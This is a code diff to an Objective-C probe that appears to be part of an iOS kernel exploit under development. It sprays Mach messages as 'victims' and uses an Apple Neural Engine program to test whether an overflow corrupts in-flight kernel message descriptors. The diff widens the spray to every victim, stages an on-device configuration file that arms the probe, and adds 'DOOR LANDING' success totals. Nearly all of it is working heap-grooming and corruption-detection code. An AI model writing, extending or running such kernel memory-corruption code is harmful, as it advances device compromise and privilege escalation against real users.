@@ -31,7 +31,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v10-doordial"
+#define P099_BUILD @"p099-aneprewire-v11-doordial-all"
 
 #define P099_INPUT_COUNT 254
 #define P099_OUTPUT_COUNT 1
@@ -301,11 +301,12 @@ static BOOL p099_vmread(uint64_t addr, uint8_t *out, uint32_t n) {
 }
 
 static int g_p099_oolHits;
-
-/* v7: one clean desc-block snapshot (from the first clean door victim
-   recv) — the smashed victims diff against it; alignment self-solves. */
-static uint8_t g_p099_clean_block[0x60];
-static BOOL     g_p099_clean_have = NO;
+/* v11 door-run totals: per-door-round read/clean/smash census — the verdict
+   speaks in door terms. (The v7/v8 snapshot-DIFFERS law is REMOVED: it
+   flagged our own msgh_id low bytes + legit translated names as "desc words
+   touched" on 20:01/v8 and 20:19/v10; the v9 per-desc pad law is the only
+   smash signal that counts.) */
+static uint32_t g_p099_dvRead, g_p099_dvClean, g_p099_dvSmash;
 
 static void p099_dump_hexline(const uint8_t *b, uint32_t n, uint32_t base,
                               const char *tag) {
@@ -327,21 +328,10 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
         return;
     }
     if (!(h->msgh_bits & MACH_MSGH_BITS_COMPLEX)) { L(@"[v7] door victim=%u simple", idx); return; }
-    /* v7: raw dump FIRST — head + first 0x50 desc-block bytes; diff vs clean */
+    /* v7: raw dump FIRST — head + first 0x50 desc-block bytes (the per-desc
+       v9 pad law below is the only smash verdict; no snapshot diffing). */
     p099_dump_hexline(rbuf, 0x20, 0, "raw");
     p099_dump_hexline(rbuf + 0x20, 0x40, 0x20, "raw");
-    if (!g_p099_clean_have
-        && rbuf[0x26] == 0x11 && rbuf[0x27] == 0x00     /* clean pad-law @+6/+7 of desc0 */
-        && memcmp(rbuf + 0x28, g_p099_clean_block, 8)) {
-        /* first clean-compliant block = the reference */
-        memcpy(g_p099_clean_block, rbuf + 0x20, 0x40);
-        g_p099_clean_have = YES;
-        L(@"[v7] clean desc-block snapshot taken (victim=%u)", idx);
-    }
-    if (g_p099_clean_have) {
-        BOOL differs = (memcmp(rbuf + 0x20, g_p099_clean_block, 0x40) != 0);
-        if (differs) L(@"[v7] *** block DIFFERS from clean (victim=%u) — desc words touched ***", idx);
-    }
     uint32_t cnt = ((mach_msg_body_t *)(rbuf + sizeof(mach_msg_header_t)))->msgh_descriptor_count;
     uint32_t smashes = 0;
     for (uint32_t i = 0; i < cnt && i < P099_PK_N_DESC; i++) {
@@ -384,6 +374,9 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
             }
         }
     }
+    g_p099_dvRead++;
+    g_p099_dvSmash += smashes;
+    if (!smashes) g_p099_dvClean++;
     if (smashes) L(@"[v7] door verdict victim=%u smashes=%u oolHits=%u", idx, smashes, g_p099_oolHits);
 }
 
@@ -432,24 +425,25 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                 /* v6b stage: the default door-round dial is WRITTEN on first
                    run so the door is armed on-device without an external
                    push; v10 refreshes by dialver. */
-                NSString *def = @"dialver=10\nportkind=96\n";
+                NSString *def = @"dialver=11\nportkind=2048\n";
                 if ([def writeToFile:dialP atomically:YES
                             encoding:NSUTF8StringEncoding error:nil])
-                    L(@"[v10] STAGED door dial (portkind=96, dialver=10); last 96 victims = door rounds");
+                    L(@"[v11] STAGED door dial (portkind=2048, dialver=11); ALL victims = door rounds");
             } else {
-                /* v10: the 20:01 round's record-crossing victim (1981) sat 5
-                   short of the door band (last 64 = 1984..2047) — the door
-                   band must COVER the crossing element, whatever element it
-                   wanders to this boot. Widen to 96 (±31 margin). The old
-                   staged portkind=64 file persists in the container across
-                   sideloads, so refresh it when dialver mismatches. */
+                /* v10→v11: the record-crossing element WANDERS boot-to-boot
+                   (v8 boot: in-flight victim 1981; v10 clean boot: no
+                   visible landing at all) — no fixed tail band covers a
+                   wanderer. v11 makes EVERY victim a portkind door victim,
+                   so wherever the record stream crosses, it crosses
+                   in-flight kmsg descs; the door pad law (v9) + [door]
+                   totals carry the verdict. */
                 NSString *cur = [NSString stringWithContentsOfFile:dialP
                     encoding:NSUTF8StringEncoding error:nil];
-                if (cur && ![cur containsString:@"dialver=10"]) {
-                    NSString *defref = @"dialver=10\nportkind=96\n";
+                if (cur && ![cur containsString:@"dialver=11"]) {
+                    NSString *defref = @"dialver=11\nportkind=2048\n";
                     if ([defref writeToFile:dialP atomically:YES
                             encoding:NSUTF8StringEncoding error:nil])
-                        L(@"[v10] dial default refreshed → portkind=96 (dialver=10)");
+                        L(@"[v11] dial default refreshed → portkind=2048 (dialver=11)");
                 }
             }
             if ([fm99 fileExistsAtPath:dialP]) {
@@ -760,6 +754,13 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                 L(@"[-] ANE rejected the program, or evaluation failed above. Honest miss.");
             }
             L(@"[*] board untouched this probe (detection only).");
+            /* v11: the door round speaks for itself */
+            L(@"[door] totals: read=%u clean=%u smash=%u oolHits=%u",
+              g_p099_dvRead, g_p099_dvClean, g_p099_dvSmash, g_p099_oolHits);
+            if (g_p099_dvSmash > 0)
+                L(@"[+] DOOR LANDING: the record stream crossed IN-FLIGHT door kmsgs (descriptors above)");
+            else if (g_p099_dvRead > 0)
+                L(@"[-] door: zero desc crossings — landing element was free/other (MAF attests ~25s) or the program was rejected");
         }
 
 finish:
